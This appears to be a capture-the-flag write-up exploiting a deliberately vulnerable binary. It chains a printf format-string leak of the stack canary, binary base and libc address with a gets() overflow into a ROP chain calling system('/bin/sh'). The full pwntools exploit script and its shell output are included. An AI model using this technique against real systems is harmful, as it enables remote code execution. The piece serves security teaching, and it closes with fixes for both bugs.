# Intro to Pwning 3

When run, the binary first asks us for the password of stage 2.
It then asks for our witch name, which it then prints back to us and then asks us for a magic spell:
```
$ ./pwn3
Enter the password of stage 2:
CSCG{...}
Enter your witch name:
Hermione
┌───────────────────────┐
│ You are a Gryffindor! │
└───────────────────────┘
Hermione enter your magic spell:
Expelliarmus
~ Protego!
```

Looking at the code we can quickly find two vulnerabilities:
1. All user input is read using the `gets` function, which doesn't have a length limit for the input and can therefore be used for buffer overflows.
2. The binary uses `printf` directly to print the entered name, which among other things allows us to leak data from the stack.

Looking at the `checksec` output we can see that the binary has everything enabled:
```
$ checksec pwn3
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We can use `gets` to overwrite a return address and build a ropchain to call `system("/bin/sh")`.
There should be a `pop rdi` gadget in the binary and the `"/bin/sh"` string can be found in `libc`.

We can use `printf` to first leak the canary and at the same time leak the base address of the binary and `libc`.

Using `gdb` and `pwndbg` we can find out that the canary is at position `33`, the return address is at `35` a `libc` address is at `39` on the stack when `printf` is called in `welcome`:
```
pwndbg> disass welcome
...
   0x0000000000000ce3 <+109>:   call   0x8a0 <printf@plt>
...
pwndbg> b *welcome+109
pwndbg> r
pwndbg> canary
AT_RANDOM = 0x7ffffffee4d8 # points to (not masked) global canary value
Canary    = 0xde09d8f9285a0c00
Found valid canaries on the stacks:
00:0000│   0x7ffffffee028 ◂— 0xde09d8f9285a0c00
pwndbg> stack 50
...
21:0108│          0x7ffffffee018 ◂— 0xde09d8f9285a0c00
22:0110│ rbp      0x7ffffffee020 —▸ 0x7ffffffee040 ◂— 0x0
23:0118│          0x7ffffffee028 —▸ 0x8000d7e (main+55) ◂— mov    eax, 0 /* 0xff30e800000000b8 */
24:0120│          0x7ffffffee030 —▸ 0x7ffffffee138 —▸ 0x7ffffffee4df ◂— 0x702f642f746e6d2f ('/mnt/d/p')
25:0128│          0x7ffffffee038 ◂— 0x100000000
26:0130│          0x7ffffffee040 ◂— 0x0
27:0138│          0x7ffffffee048 —▸ 0x7fffff610ceb (__libc_start_main+235) ◂— mov    edi, eax
...
pwndbg> pi 0x21
33
```

Because `printf`'s first six variadic arguments are taken from registers we can leak the canary and addresses using `%39$p %41$p %45$p` i.e. printing the 39th, 41st  and 45th arguments to `printf` as pointers which will be the 33rd, 35th, and 39th value on the stack:

```
Enter your witch name:
%39$p %41$p %45$p
┌───────────────────────┐
│ You are a Gryffindor! │
└───────────────────────┘
0x90016f426eb54100 0x7fee0ea00d7e 0x7fee0e7a3ceb enter your magic spell:
```

Using the [libc database](https://github.com/niklasb/libc-database) we can find out the address of `system` and a `/bin/sh` string in libc:
```
$ ldd pwn3
        linux-vdso.so.1 (0x00007ffebb5eb000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6b61dc2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f6b621bf000)
$ /tools/libc-database/identify /lib/x86_64-linux-gnu/libc.so.6
id libc6_2.30-0ubuntu2.1_amd64
$ /tools/libc-database/dump libc6_2.30-0ubuntu2.1_amd64
offset___libc_start_main_ret = 0x271e3
offset_system = 0x00000000000554e0
offset_dup2 = 0x0000000000111b60
offset_read = 0x0000000000111260
offset_write = 0x0000000000111300
offset_str_bin_sh = 0x1b6613
```

Using `ropper` or `ROPgadget` we can also find the address of the ever present `pop rdi; ret` gadget in the binary:
```
$ ropper -f pwn3 | grep rdi
...
0x0000000000000df3: pop rdi; ret;
```

And taking another look with `gdb` we can find out the offset between the buffer and the canary and return address for the second `gets`, which is `0x108` and `0x118` bytes:
```
pwndbg> disass AAAAAAAA
...
   0x0000000000000ced <+53>:    call   0x8c0 <gets@plt>
   0x0000000000000cf2 <+58>:    lea    rax,[rbp-0x110]
...
pwndbg> b *AAAAAAAA+58
pwndbg> r
Hermione enter your magic spell:
AAAAAAAA
pwndbg> stack 50
00:0000│ rax r8 r10 r11 rsp  0x7ffffffedf10 ◂— 'AAAAAAAA'
...
21:0108│                     0x7ffffffee018 ◂— 0xd5c4e946c7e0a00
22:0110│ rbp                 0x7ffffffee020 —▸ 0x7ffffffee040 ◂— 0x0
23:0118│                     0x7ffffffee028 —▸ 0x8000d88 (main+65) ◂— nop     /* 0x441f0fc3c990 */
```

We also have to start the input for the second `gets` with `"Expelliarmus\0"` because the program
compares the spell we give it and immediately exits if it's not `"Expelliarmus"`.
Luckily `strcmp` stops at null-bytes but `gets` reads until newlines so this is not a problem.

Trying the exploit will now give a `segfault` in `system` because of a misaligned stack
but we can just add an extra `ret` before `system` to the ropchain.
This will cause the stack to be one value further down, so it will be aligned correctly.

The final exploit now looks like this:
```python
#!/usr/bin/env python3

from pwn import *

PASSWORD = "CSCG{NOW_GET_VOLDEMORT}"
LIBC_START_MAIN_RET_OFFSET = 0x271e3
LIBC_SYSTEM_OFFSET = 0x554e0
LIBC_BIN_SH_OFFSET = 0x1b6613
WELCOME_RET_OFFSET = 0xd7e
POP_RDI = 0xdf3
RET = 0xdf4

p = remote("hax1.allesctf.net", 9102)

p.recvuntil("Enter the password of stage 2:\n")
p.sendline(PASSWORD)

p.recvuntil("Enter your witch name:")
p.sendline("#%39$llu|%41$llu|%45$llu#")

p.recvuntil("#")
canary, ret_addr, libc_addr = map(int, p.recvuntil("#")[:-1].split(b"|"))
libc_addr -= LIBC_START_MAIN_RET_OFFSET
binary_addr = ret_addr - WELCOME_RET_OFFSET

log.info(f"Leaked stack canary: {canary:#x}")
log.info(f"Leaked binary address: {binary_addr:#x}")
log.info(f"Leaked libc address: {libc_addr:#x}")

p.recvuntil(":")

payload = b"Expelliarmus\0".ljust(0x108)
payload += p64(canary)
payload += b"A" * 8
payload += p64(binary_addr + POP_RDI)
payload += p64(libc_addr + LIBC_BIN_SH_OFFSET)
payload += p64(binary_addr + RET)
payload += p64(libc_addr + LIBC_SYSTEM_OFFSET)

p.sendline(payload)
p.interactive()
```

And running it gives us a shell and the flag:
```
$ ./exploit.py
[+] Opening connection to hax1.allesctf.net on port 9102: Done
[*] Leaked stack canary: 0x72bdf49b0dd52c00
[*] Leaked binary address: 0x56531cbdc000
[*] Leaked libc address: 0x7fc1297e6000
[*] Switching to interactive mode

~ Protego!
$ cat flag
CSCG{VOLDEMORT_DID_NOTHING_WRONG}
```

Clearly, it's better to follow the `man`-pages advice and `Never use gets(). [...] Use fgets() instead.`
And of course, letting users control the first argument of `printf` is equally bad.
Instead, `printf("%s", user_input)` should be used. Otherwise, even stack canaries can't help.
